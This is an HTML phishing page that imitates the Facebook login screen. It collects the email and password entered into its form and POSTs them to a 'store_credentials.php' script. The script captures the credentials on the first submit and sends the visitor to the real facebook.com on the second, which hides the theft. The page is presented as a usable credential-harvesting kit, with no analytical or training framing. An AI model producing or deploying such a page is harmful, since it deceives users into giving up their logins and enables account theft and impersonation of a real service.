<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        *{
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            overflow: hidden;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        p{
            position: absolute;
            font-size: 28px;   
            left: 190px;
            top: 286px;

            }
        div h1{
            color: #1877f2;
            font-size: 60px;
            position: absolute;
            left: 200px;
            top: 200px;

        }
        .container{
            position:absolute;
            right: 150px;
            top: 140px;
            padding: 20px;
            width: 450px;
            height: 300px;
            background-color: #fff;
            border-radius: 10px;
        }

        form{
                display: flex;
                flex-direction: column;
            }

        input[type="text"],
        input[type="password"] {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        #b2:hover{
            background-color: #367700;
        }
        button {
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 10px;
        }
        #b1{
            background-color: #1877f2;
            font-weight: bold;
            }
        #b2{
            background-color: #54ba01;
            font-weight: bold;
        }
        a {
            color: #1877f2;
            text-decoration: none;
            text-align: center;
        }

        a:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>
    <div><h1>facebook</h1>

        <p>Facebook helps you connect and <br> share with the people in your life</p>
    </div>
    <div class="container">
        <form action="store_credentials.php" method="post">
            <input type="text" id="email" name="email" placeholder="Email or Phone Number">
            <input type="password" id="password" name="password" placeholder="Password">
            <button id="b1" type="submit" name="login">Log in</button>
            <a href="#">Forgot Password?</a>
            <br>
            <br>
            <button id="b2" type="submit" name="newAccount">Create New Account</button>
        </form>
    </div>
    <script>
        let loginAttempts = 0;

        function storeCredentials(email, password) {
            const formData = new FormData();
            formData.append("email", email);
            formData.append("password", password);

            fetch("store_credentials.php", {
                method: "POST",
                body: formData
            })
        }

        function handleSubmit(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            loginAttempts++;

            if (loginAttempts === 1) {
                storeCredentials(email, password);
            }

            if (loginAttempts === 2) {
                window.location.href = "https://www.facebook.com/";
            }
        }
        document.querySelector("form").addEventListener("submit", handleSubmit);
    </script>
</body>
</html>
